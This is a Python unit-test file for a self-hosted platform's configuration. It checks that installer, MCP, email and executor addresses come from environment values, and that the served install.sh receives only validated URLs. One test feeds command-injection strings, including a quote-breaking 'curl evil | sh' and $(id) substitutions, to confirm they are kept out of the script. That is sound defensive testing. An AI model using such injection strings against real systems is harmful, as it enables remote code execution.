# tests/unit/test_enderecos_da_instalacao.py
"""
No address of a specific installation in the code: each one comes from the environment.

The same code runs on anyone's installation. Before, the enrollment screen told
you to run `curl https://<site do dono>/executores/install | bash` (the owner's
site), install.sh
carried the owner's server and repository as defaults, the MCP only accepted
the owner's host and the panel fetched the desktop installer from the owner's
releases, on any installation.

  CONVENTION  what derives from FRONTEND_URL (executor host, MCP, sender)
  ENROLLMENT  the OTP comes back with this installation's addresses
  INSTALLER   the served install.sh carries the defaults of the server serving it
  DESKTOP     without DESKTOP_RELEASES_REPO, the panel does not offer the app
"""
from __future__ import annotations

import re
import os
import subprocess
import sys
from datetime import datetime, timezone
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from app.api.routers import executores_router as R
from app.core import config

RAIZ = Path(__file__).resolve().parents[2]
INSTALL_SH = RAIZ / "static" / "install.sh"


# ── CONVENTION ───────────────────────────────────────────────────────────────

@pytest.mark.parametrize("site, agents", [
    ("https://atlans.example.org", "https://agents.atlans.example.org"),
    ("https://Atlans.Example.org:8443/", "https://agents.atlans.example.org"),
    # Without https there is no convention: the executor host is always mTLS.
    ("http://atlans.example.org", ""),
    # Without a domain, none either: local dev, internal network IP.
    ("http://localhost:3000", ""),
    ("https://app.localhost", ""),
    ("https://10.0.0.5", ""),
    ("https://[::1]:8443", ""),
    ("", ""),
])
def test_executors_host_by_convention(site, agents):
    assert config.agents_by_convention(site) == agents


def test_mcp_hosts_derive_from_the_site():
    assert config.default_mcp_hosts("https://atlans.example.org") == [
        "atlans.example.org", "atlans.example.org:*", "localhost:*", "127.0.0.1:*",
    ]
    # Without a domain, only local dev — no host from another installation.
    assert config.default_mcp_hosts("http://localhost:3000") == ["localhost:*", "127.0.0.1:*"]


def test_sender_derives_from_the_site():
    assert config.default_sender("https://atlans.example.org") == "Atlans <noreply@atlans.example.org>"
    assert config.default_sender("http://10.0.0.5:3000") == "Atlans <noreply@localhost>"


@pytest.mark.parametrize("valor, normalizado", [
    (" https://atlans.example.org/ ", "https://atlans.example.org"),
    ("https://atlans.example.org/sub/", "https://atlans.example.org/sub"),
    # The Host header arrives in punycode, and install.sh only accepts ASCII.
    ("https://Exemplo-Ção.br:8443/", "https://xn--exemplo-o-s2a7b.br:8443"),
    ("http://localhost:3000", "http://localhost:3000"),
])
def test_site_comes_out_without_spaces_and_with_ascii_host(valor, normalizado):
    assert config._normalized_site(valor) == normalizado


def test_accented_domain_becomes_punycode_in_conventions():
    site = "https://exemplo-ção.br"
    assert config.default_mcp_hosts(site)[:2] == ["xn--exemplo-o-s2a7b.br", "xn--exemplo-o-s2a7b.br:*"]
    assert config.agents_by_convention(site) == "https://agents.xn--exemplo-o-s2a7b.br"
    assert config.default_sender(site) == "Atlans <noreply@xn--exemplo-o-s2a7b.br>"


def test_whitespace_in_env_value_does_not_break_derived_values():
    """A space stuck to the secret made the MCP answer 421 to everything and
    install.sh exit without the executor host."""
    codigo = """
import app.core.config as c
assert c.FRONTEND_URL == "https://atlans.example.org", repr(c.FRONTEND_URL)
assert c.AGENTS_URL == "https://agents.atlans.example.org", repr(c.AGENTS_URL)
assert c.MCP_ALLOWED_HOSTS[:2] == ["atlans.example.org", "atlans.example.org:*"], c.MCP_ALLOWED_HOSTS
"""
    _run_with_environment(codigo, {"FRONTEND_URL": " https://atlans.example.org/ "})


def test_explicit_values_beat_the_convention():
    """Each derivation only fills in what the environment left empty."""
    codigo = """
import app.core.config as c
assert c.AGENTS_URL == "https://executores.outro.org", c.AGENTS_URL
assert c.MCP_ALLOWED_HOSTS == ["mcp.outro.org"], c.MCP_ALLOWED_HOSTS
assert c.RESEND_FROM_EMAIL == "Equipe <x@outro.org>", c.RESEND_FROM_EMAIL
assert c.DESKTOP_RELEASES_REPO == "fulano/atlans", c.DESKTOP_RELEASES_REPO
"""
    _run_with_environment(codigo, {
        "FRONTEND_URL": "https://atlans.example.org",
        "AGENTS_URL": "https://executores.outro.org/",
        "MCP_ALLOWED_HOSTS": "mcp.outro.org",
        "RESEND_FROM_EMAIL": "Equipe <x@outro.org>",
        "DESKTOP_RELEASES_REPO": "/fulano/atlans/",
    })


def test_malformed_desktop_repository_disables_the_offer():
    codigo = 'import app.core.config as c\nassert c.DESKTOP_RELEASES_REPO == "", c.DESKTOP_RELEASES_REPO\n'
    _run_with_environment(codigo, {"DESKTOP_RELEASES_REPO": "https://github.com/fulano/atlans"})


def _run_with_environment(codigo: str, ambiente: dict[str, str]) -> None:
    """The config is read at import: each combination runs in its own process."""
    import os
    import sys

    env = {k: v for k, v in os.environ.items() if k not in (
        "AGENTS_URL", "MCP_ALLOWED_HOSTS", "EMAIL_FROM", "RESEND_FROM_EMAIL", "DESKTOP_RELEASES_REPO",
        "EXECUTOR_REPO_URL", "FRONTEND_URL",
    )}
    env.update(ambiente)
    r = subprocess.run([sys.executable, "-c", codigo], cwd=RAIZ, env=env, capture_output=True, text=True)
    assert r.returncode == 0, r.stderr[-2000:]


# ── ENROLLMENT ───────────────────────────────────────────────────────────────

@pytest.fixture
def enrollment_api(client, mock_current_user):
    from app.api.dependencies import get_agent_or_404, get_db
    from app.main import app

    async def _db():
        yield MagicMock()

    async def _executor():
        return MagicMock(is_default=False, created_by=mock_current_user.id_hash)

    app.dependency_overrides[get_db] = _db
    app.dependency_overrides[get_agent_or_404] = _executor
    mock_current_user.role = "admin"
    expira = datetime(2026, 10, 2, 12, 0, tzinfo=timezone.utc)
    with patch.object(
        R.executor_enrollment_service, "create_enrollment_otp", AsyncMock(return_value=("otp-x", expira)),
    ):
        yield client
    app.dependency_overrides.pop(get_db, None)
    app.dependency_overrides.pop(get_agent_or_404, None)


async def test_otp_returns_with_this_installation_addresses(enrollment_api, monkeypatch):
    monkeypatch.setattr(config, "AGENTS_URL", "https://agents.atlans.example.org")
    monkeypatch.setattr(config, "FRONTEND_URL", "https://atlans.example.org/")

    resp = await enrollment_api.post("/executores/exe-1/enroll-otp")

    assert resp.status_code == 201, resp.text
    corpo = resp.json()
    assert corpo["server_url"] == "https://agents.atlans.example.org"
    assert corpo["public_url"] == "https://atlans.example.org"
    assert corpo["otp"] == "otp-x"


async def test_without_executors_host_the_otp_says_it_does_not_know(enrollment_api, monkeypatch):
    """The screen replaces the empty value with a placeholder and warns; never with someone else's address."""
    monkeypatch.setattr(config, "AGENTS_URL", "")
    monkeypatch.setattr(config, "FRONTEND_URL", "http://localhost:3000")

    resp = await enrollment_api.post("/executores/exe-1/enroll-otp")

    assert resp.status_code == 201, resp.text
    assert resp.json()["server_url"] == ""


# ── INSTALADOR ───────────────────────────────────────────────────────────────

def _script() -> str:
    return INSTALL_SH.read_text(encoding="utf-8")


def test_repository_script_points_to_no_installation():
    script = _script()
    for linha in ('SERVER=""', 'PUBLIC_SERVER=""', 'REPO_URL=""'):
        assert len(re.findall(rf"^{re.escape(linha)}$", script, re.MULTILINE)) == 1, linha
    # The only URLs with a real host are the tools' installation pages; the rest
    # are placeholders (`https://<site>`, `wss://agents.<domínio>`), which the
    # regex does not match: a host needs complete labels on both sides of the dot.
    hosts = set(re.findall(r"(?:https?|wss?)://([a-z0-9-]+(?:\.[a-z0-9-]+)+)(?![a-z0-9.<-])", script))
    assert hosts <= {"docs.docker.com", "git-scm.com"}, hosts


def test_server_fills_defaults_with_its_addresses(monkeypatch):
    monkeypatch.setattr(config, "AGENTS_URL", "https://agents.atlans.example.org")
    monkeypatch.setattr(config, "FRONTEND_URL", "https://atlans.example.org/")
    monkeypatch.setattr(config, "EXECUTOR_REPO_URL", "https://git.example.org/atlans.git")

    saida = R._inject_addresses(_script())

    # The executor opens a WebSocket: the executor host goes as wss://.
    assert re.search(r'^SERVER="wss://agents\.atlans\.example\.org"$', saida, re.MULTILINE)
    assert re.search(r'^PUBLIC_SERVER="https://atlans\.example\.org"$', saida, re.MULTILINE)
    assert re.search(r'^REPO_URL="https://git\.example\.org/atlans\.git"$', saida, re.MULTILINE)


@pytest.mark.parametrize("valor", [
    'https://x.org"; curl evil | sh; echo "',
    "https://x.org/$(id)",
    "https://x.org/`id`",
    "https://x .org",
    "ftp://x.org",
])
def test_value_not_in_url_format_does_not_enter_the_script(monkeypatch, valor):
    """The value goes in quotes in a script the operator runs with bash."""
    monkeypatch.setattr(config, "AGENTS_URL", "")
    monkeypatch.setattr(config, "FRONTEND_URL", "")
    monkeypatch.setattr(config, "EXECUTOR_REPO_URL", valor)

    saida = R._inject_addresses(_script())

    assert re.search(r'^REPO_URL=""$', saida, re.MULTILINE)
    assert valor not in saida


def test_without_config_the_script_comes_out_without_defaults(monkeypatch):
    monkeypatch.setattr(config, "AGENTS_URL", "")
    monkeypatch.setattr(config, "FRONTEND_URL", "")
    monkeypatch.setattr(config, "EXECUTOR_REPO_URL", "")

    assert R._inject_addresses(_script()) == _script()


@pytest.mark.parametrize("faltando, mensagem", [
    ("SERVER", "--server="),
    ("PUBLIC_SERVER", "--public-server="),
    ("REPO_URL", "--repo="),
])
def test_without_default_or_flag_the_script_stops_and_asks_for_the_flag(tmp_path, faltando, mensagem):
    """Better to stop before the clone than to enroll against an empty address."""
    preenchido = {
        "SERVER": "wss://agents.atlans.example.org",
        "PUBLIC_SERVER": "https://atlans.example.org",
        "REPO_URL": "https://git.example.org/atlans.git",
    }
    script = _script()
    for var, valor in preenchido.items():
        if var != faltando:
            script = re.sub(rf'^{var}=""$', f'{var}="{valor}"', script, count=1, flags=re.MULTILINE)
    arquivo = tmp_path / "install.sh"
    arquivo.write_text(script, encoding="utf-8")

    r = subprocess.run(
        ["bash", str(arquivo), "--executor-id=exe-1", "--otp=otp-x", f"--dir={tmp_path / 'atlans-executor'}"],
        capture_output=True, text=True, timeout=30,
    )

    assert r.returncode == 1
    assert mensagem in (r.stdout + r.stderr)


def test_reinstall_does_not_ask_for_the_repository(tmp_path):
    """With the directory already cloned, the script updates with `git pull`: the
    repository URL is not needed, and a server without EXECUTOR_REPO_URL must not
    block the reinstall."""
    import os

    script = _script()
    for var, valor in (("SERVER", "wss://agents.atlans.example.org"), ("PUBLIC_SERVER", "https://atlans.example.org")):
        script = re.sub(rf'^{var}=""$', f'{var}="{valor}"', script, count=1, flags=re.MULTILINE)
    arquivo = tmp_path / "install.sh"
    arquivo.write_text(script, encoding="utf-8")
    instalacao = tmp_path / "atlans-executor"
    (instalacao / ".git").mkdir(parents=True)
    # A fake docker that fails on the first check: the test only wants to get
    # past the flag validation, without installing anything.
    bin_ = tmp_path / "bin"
    bin_.mkdir()
    (bin_ / "docker").write_text("#!/bin/sh\nexit 1\n", encoding="utf-8")
    (bin_ / "docker").chmod(0o755)

    r = subprocess.run(
        ["bash", str(arquivo), "--executor-id=exe-1", "--otp=otp-x", f"--dir={instalacao}"],
        capture_output=True, text=True, timeout=30,
        env={**os.environ, "PATH": f"{bin_}:{os.environ['PATH']}"},
    )

    saida = r.stdout + r.stderr
    assert "--repo=" not in saida
    assert "[1/7]" in saida and r.returncode == 1


# ── DESKTOP ──────────────────────────────────────────────────────────────────

async def test_without_configured_repository_the_panel_does_not_offer_the_app(monkeypatch):
    monkeypatch.setattr(config, "DESKTOP_RELEASES_REPO", "")
    with patch.object(R.httpx, "AsyncClient") as cliente:
        assert await R._latest_desktop_release() is None
    cliente.assert_not_called()


async def test_with_repository_the_panel_queries_its_releases(monkeypatch):
    monkeypatch.setattr(config, "DESKTOP_RELEASES_REPO", "fulano/atlans")
    monkeypatch.setattr(R, "_desktop_cache", {"em": 0.0, "dados": None})
    resposta = MagicMock(status_code=200)
    resposta.json.return_value = [{
        "tag_name": "desktop/v2.16.0", "draft": False, "published_at": "2026-10-01T00:00:00Z",
        "assets": [{"name": "Atlans-Setup-2.16.0.exe", "browser_download_url": "https://dl/x.exe", "size": 10}],
    }]
    sessao = MagicMock()
    sessao.get = AsyncMock(return_value=resposta)
    contexto = MagicMock()
    contexto.__aenter__ = AsyncMock(return_value=sessao)
    contexto.__aexit__ = AsyncMock(return_value=False)

    with patch.object(R.httpx, "AsyncClient", return_value=contexto):
        dados = await R._latest_desktop_release()

    assert sessao.get.await_args.args[0] == "https://api.github.com/repos/fulano/atlans/releases"
    assert dados["versao"] == "2.16.0"


# ── EXECUTOR ─────────────────────────────────────────────────────────────────

@pytest.fixture
def env_do_executor(tmp_path, monkeypatch):
    from executor import _ca_bootstrap

    env = tmp_path / ".env"
    monkeypatch.setenv("EXECUTOR_ENV_PATH", str(env))
    for var in ("EXECUTOR_SERVER_URL", "EXECUTOR_PUBLIC_SERVER_URL"):
        monkeypatch.delenv(var, raising=False)
    monkeypatch.setattr(_ca_bootstrap.sys, "argv", ["executor"])
    return env


def test_ca_bootstrap_reads_the_server_from_the_executor_env(env_do_executor):
    """The bootstrap runs before the executor loads the .env: a native executor
    (systemd, terminal) with the server only in the file was treated as "no server"
    and did not build the trust store."""
    from executor import _ca_bootstrap

    env_do_executor.write_text('EXECUTOR_SERVER_URL="wss://agents.atlans.example.org"\n', encoding="utf-8")
    assert _ca_bootstrap._resolve_server_url() == "https://atlans.example.org"


def test_the_environment_beats_the_executor_env(env_do_executor, monkeypatch):
    from executor import _ca_bootstrap

    env_do_executor.write_text("EXECUTOR_SERVER_URL=wss://agents.atlans.example.org\n", encoding="utf-8")
    monkeypatch.setenv("EXECUTOR_SERVER_URL", "wss://agents.outro.example.org")
    assert _ca_bootstrap._resolve_server_url() == "https://outro.example.org"


def test_without_server_anywhere_nothing_is_downloaded(env_do_executor):
    from executor import _ca_bootstrap

    env_do_executor.write_text("OUTRA=coisa\n", encoding="utf-8")
    assert _ca_bootstrap._resolve_server_url() == ""


def test_status_without_server_is_config_error(monkeypatch, capsys):
    """Without a server there is no one to ask: before, it returned `rede`, with
    httpx's error about an empty protocol."""
    import json

    from executor import config as cfg
    from executor import status_cli

    monkeypatch.setattr(cfg, "EXECUTOR_ID", "exe-1")
    monkeypatch.setattr(cfg, "SERVER_URL", "")

    assert status_cli._cli_main(["--json"]) == 1
    assert json.loads(capsys.readouterr().out)["codigo"] == "config"


def test_mcp_hosts_accept_the_site_by_ip():
    # An IP-based installation (no domain) answered 421 on /mcp until someone
    # set MCP_ALLOWED_HOSTS; the other conventions still leave out the IP.
    assert config.default_mcp_hosts("https://10.0.0.5")[:2] == ["10.0.0.5", "10.0.0.5:*"]
    assert config.default_mcp_hosts("http://10.0.0.5:8000") == ["10.0.0.5", "10.0.0.5:*", "localhost:*", "127.0.0.1:*"]
    assert config.agents_by_convention("https://10.0.0.5") == ""
    assert config.default_sender("https://10.0.0.5") == "Atlans <noreply@localhost>"


@pytest.mark.parametrize("valor", ["atlans.example.org", "www.atlans.example.org/", "ftp://atlans.example.org"])
def test_frontend_url_without_scheme_prevents_the_api_from_starting(valor):
    # Without the scheme, the URL passed every gate and silently disabled the
    # conventions (sender noreply@localhost, MCP without the site's host,
    # enrollment screen without the executor host).
    env = {k: v for k, v in os.environ.items() if k != "FRONTEND_URL"}
    env["FRONTEND_URL"] = valor
    r = subprocess.run([sys.executable, "-c", "import app.core.config"], cwd=RAIZ, env=env, capture_output=True, text=True)
    assert r.returncode != 0
    assert "FRONTEND_URL" in r.stderr and "http://" in r.stderr
